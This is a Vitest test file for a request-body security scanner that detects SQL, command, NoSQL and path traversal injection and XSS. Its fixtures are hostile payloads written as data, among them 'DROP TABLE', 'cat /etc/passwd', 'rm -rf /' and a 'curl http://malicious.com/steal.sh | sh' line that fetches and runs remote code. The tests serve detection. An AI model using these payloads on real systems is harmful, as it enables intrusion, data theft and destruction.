// @ts-nocheck
import { describe, it, expect } from 'vitest';
import { securityService } from '../security.service.js';

describe('SecurityService', () => {
  describe('SQL Injection Detection', () => {
    it('should detect SQL injection with OR statement', () => {
      const body = {
        userId: "admin' OR '1'='1' --",
        amount: 100,
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('sql_injection');
      expect(threats[0].field).toBe('userId');
      expect(threats[0].severity).toBe('medium');
    });

    it('should detect SQL injection with DROP TABLE', () => {
      const body = {
        query: "SELECT * FROM users; DROP TABLE users;--",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('sql_injection');
      expect(threats[0].severity).toBe('high');
    });

    it('should detect SQL injection with UNION SELECT', () => {
      const body = {
        search: "test' UNION ALL SELECT password FROM users--",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('sql_injection');
      expect(threats[0].severity).toBe('high');
    });

    it('should NOT detect SQL-like keywords in normal text', () => {
      const body = {
        description: "Please select from the dropdown menu",
        title: "How to insert data into database tutorial",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBe(0);
    });
  });

  describe('Command Injection Detection', () => {
    it('should detect command injection with pipe', () => {
      const body = {
        filename: "test.txt | cat /etc/passwd",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('command_injection');
      expect(threats[0].field).toBe('filename');
      expect(threats[0].severity).toBe('high'); // All command injection is high severity
    });

    it('should detect command injection with semicolon', () => {
      const body = {
        command: "ls; rm -rf /tmp/*",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('command_injection');
      expect(threats[0].severity).toBe('high');
    });

    it('should detect command injection with backticks', () => {
      const body = {
        input: "test `whoami`",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('command_injection');
      expect(threats[0].severity).toBe('high');
    });

    it('should detect command injection with $() substitution', () => {
      const body = {
        value: "test $(cat /etc/passwd)",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('command_injection');
      expect(threats[0].severity).toBe('high');
    });

    it('should NOT detect semicolon in normal text without commands', () => {
      const body = {
        currency: "; cat /etc/passwd",
        description: "This is a test; please review",
      };

      // This SHOULD detect the threat because "; cat" is a command injection pattern
      const threats = securityService.scanRequestBody(body);

      // The first one should be detected (it's a command injection)
      const currencyThreat = threats.find(t => t.field === 'currency');
      expect(currencyThreat).toBeDefined();
      expect(currencyThreat.threatType).toBe('command_injection');
      expect(currencyThreat.severity).toBe('high');

      // The second one should NOT be detected (normal text)
      const descriptionThreat = threats.find(t => t.field === 'description');
      expect(descriptionThreat).toBeUndefined();
    });
  });

  describe('Path Traversal Detection', () => {
    it('should detect path traversal with ../', () => {
      const body = {
        file: "../../etc/passwd",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('path_traversal');
      expect(threats[0].severity).toBe('high');
    });

    it('should detect URL encoded path traversal', () => {
      const body = {
        path: "%2e%2e/%2e%2e/etc/passwd",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('path_traversal');
    });
  });

  describe('XSS Detection', () => {
    it('should detect XSS with script tag', () => {
      const body = {
        comment: "<script>alert('XSS')</script>",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('xss');
    });

    it('should detect XSS with onerror event', () => {
      const body = {
        image: "<img src=x onerror=alert('XSS')>",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('xss');
    });

    it('should detect XSS with javascript: protocol', () => {
      const body = {
        link: "javascript:alert('XSS')",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('xss');
    });
  });

  describe('NoSQL Injection Detection', () => {
    it('should detect NoSQL injection with $ne', () => {
      const body = {
        username: { $ne: null },
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('nosql_injection');
    });

    it('should detect NoSQL injection with $where', () => {
      const body = {
        filter: '{"$where": "this.password == \'pass\'"}',
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('nosql_injection');
    });
  });

  describe('Nested Object Scanning', () => {
    it('should detect threats in nested objects', () => {
      const body = {
        user: {
          id: 123,
          query: "SELECT * FROM admin; DROP TABLE users;--",
        },
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].field).toBe('user.query');
      expect(threats[0].threatType).toBe('sql_injection');
    });

    it('should detect threats in arrays', () => {
      const body = {
        commands: [
          "normal command",
          "test | rm -rf /",
        ],
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].field).toBe('commands[1]');
      expect(threats[0].threatType).toBe('command_injection');
    });

    it('should detect threats in deeply nested structures', () => {
      const body = {
        data: {
          users: [
            {
              name: "John",
              filter: { $ne: null },
            },
          ],
        },
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].field).toContain('data.users[0].filter');
    });
  });

  describe('hasHighSeverityThreats', () => {
    it('should return true when high severity threats exist', () => {
      const threats = [
        {
          field: 'query',
          value: 'DROP TABLE users',
          threatType: 'sql_injection',
          pattern: 'DROP TABLE',
          severity: 'high',
        },
      ];

      expect(securityService.hasHighSeverityThreats(threats)).toBe(true);
    });

    it('should return false when only medium/low severity threats exist', () => {
      const threats = [
        {
          field: 'search',
          value: "' OR '1'='1",
          threatType: 'sql_injection',
          pattern: "OR '1'='1",
          severity: 'medium',
        },
      ];

      expect(securityService.hasHighSeverityThreats(threats)).toBe(false);
    });
  });

  describe('formatThreats', () => {
    it('should format threats as a readable string', () => {
      const threats = [
        {
          field: 'userId',
          value: "admin' OR '1'='1",
          threatType: 'sql_injection',
          pattern: "OR '1'='1",
          severity: 'medium',
        },
      ];

      const formatted = securityService.formatThreats(threats);

      expect(formatted).toContain('SQL_INJECTION');
      expect(formatted).toContain('userId');
      expect(formatted).toContain("OR '1'='1");
      expect(formatted).toContain('medium');
    });
  });

  describe('Real-world Attack Scenarios', () => {
    it('should block payment manipulation with SQL injection', () => {
      const body = {
        amount: 100,
        userId: "1' OR amount=0 --",
        currency: "USD",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(securityService.hasHighSeverityThreats(threats)).toBe(false); // OR is medium
    });

    it('should block data exfiltration attempt', () => {
      const body = {
        search: "products' UNION SELECT username,password FROM users--",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(securityService.hasHighSeverityThreats(threats)).toBe(true);
    });

    it('should block remote code execution attempt', () => {
      const body = {
        webhook_url: "http://example.com/webhook && curl http://malicious.com/steal.sh | sh",
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].threatType).toBe('command_injection');
      expect(securityService.hasHighSeverityThreats(threats)).toBe(true);
    });

    it('should allow legitimate values that might look suspicious', () => {
      const body = {
        amount: 100,
        currency: "USD",
        description: "Payment for services; thank you!",
        email: "user@example.com",
        tags: ["select-all", "update-profile"],
      };

      const threats = securityService.scanRequestBody(body);

      expect(threats.length).toBe(0);
    });
  });
});
